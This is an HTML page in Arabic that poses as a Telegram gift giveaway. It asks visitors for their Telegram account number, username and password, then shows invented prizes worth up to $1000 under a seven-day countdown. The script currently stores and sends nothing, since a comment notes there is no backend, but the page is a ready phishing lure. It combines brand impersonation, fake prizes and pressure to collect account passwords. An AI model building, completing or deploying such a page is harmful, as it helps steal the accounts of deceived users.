<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>مسابقة هدايا تيليجرام</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #0088cc 0%, #ffffff 100%);
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
      padding: 32px 24px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    h1 {
      color: #0088cc;
      margin-bottom: 16px;
    }
    .input-group {
      margin-bottom: 18px;
      text-align: right;
    }
    label {
      display: block;
      margin-bottom: 6px;
      color: #333;
      font-weight: 700;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 1rem;
      box-sizing: border-box;
    }
    button {
      background: #0088cc;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 12px 0;
      width: 100%;
      font-size: 1.1rem;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: #005f8c;
    }
    .success {
      color: #27ae60;
      font-size: 1.2rem;
      margin-bottom: 18px;
    }
    .giveaway {
      margin-top: 24px;
    }
    .gifts {
      display: flex;
      flex-direction: column;
      gap: 16px;
      margin: 24px 0;
    }
    .gift {
      background: #f7f7f7;
      border-radius: 10px;
      padding: 12px;
      display: flex;
      align-items: center;
      gap: 12px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
    }
    .gift img {
      width: 48px;
      height: 48px;
      border-radius: 8px;
      object-fit: cover;
      border: 2px solid #0088cc;
    }
    .gift-info {
      text-align: right;
    }
    .gift-title {
      font-weight: 700;
      color: #0088cc;
    }
    .gift-price {
      color: #e67e22;
      font-size: 0.95rem;
    }
    .countdown {
      font-size: 1.3rem;
      color: #c0392b;
      font-weight: 700;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <div class="container" id="login-container">
    <h1>تسجيل الدخول</h1>
    <form id="login-form">
      <div class="input-group">
        <label for="tg-id">رقم حساب تيليجرام</label>
        <input type="text" id="tg-id" required placeholder="مثال: 123456789">
      </div>
      <div class="input-group">
        <label for="tg-username">يوزر تيليجرام</label>
        <input type="text" id="tg-username" required placeholder="مثال: @username">
      </div>
      <div class="input-group">
        <label for="password">كلمة السر</label>
        <input type="password" id="password" required placeholder="********">
      </div>
      <button type="submit">تسجيل الدخول</button>
    </form>
  </div>

  <div class="container" id="success-container" style="display:none;">
    <div class="success">تم تسجيل الدخول بنجاح!</div>
    <div class="giveaway">
      <h2>مسابقة السحب على هدايا تيليجرام</h2>
      <div class="countdown" id="countdown"></div>
      <div>سارع بالمشاركة! إعلان الفائزين بعد انتهاء العد التنازلي.</div>
      <div class="gifts">
        <div class="gift">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram Premium">
          <div class="gift-info">
            <div class="gift-title">اشتراك تيليجرام بريميوم لمدة سنة</div>
            <div class="gift-price">القيمة: 60$</div>
          </div>
        </div>
        <div class="gift">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram Gold Number">
          <div class="gift-info">
            <div class="gift-title">رقم ذهبي تيليجرام</div>
            <div class="gift-price">القيمة: 500$</div>
          </div>
        </div>
        <div class="gift">
          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram Special Gift">
          <div class="gift-info">
            <div class="gift-title">هدايا تيليجرام مميزة</div>
            <div class="gift-price">القيمة: حتى 1000$</div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // عد تنازلي لمدة 7 أيام من الآن
    const countdownElement = document.getElementById('countdown');
    const now = new Date();
    const endDate = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);
    function updateCountdown() {
      const now = new Date();
      const diff = endDate - now;
      if (diff <= 0) {
        countdownElement.textContent = 'انتهى الوقت! سيتم إعلان الفائزين قريباً.';
        return;
      }
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
      const minutes = Math.floor((diff / (1000 * 60)) % 60);
      const seconds = Math.floor((diff / 1000) % 60);
      countdownElement.textContent = `الوقت المتبقي: ${days} يوم ${hours} ساعة ${minutes} دقيقة ${seconds} ثانية`;
    }
    setInterval(updateCountdown, 1000);
    updateCountdown();

    // تسجيل الدخول
    const loginForm = document.getElementById('login-form');
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      // تحقق بسيط (بدون backend)
      document.getElementById('login-container').style.display = 'none';
      document.getElementById('success-container').style.display = 'block';
    });
  </script>
</body>
</html>
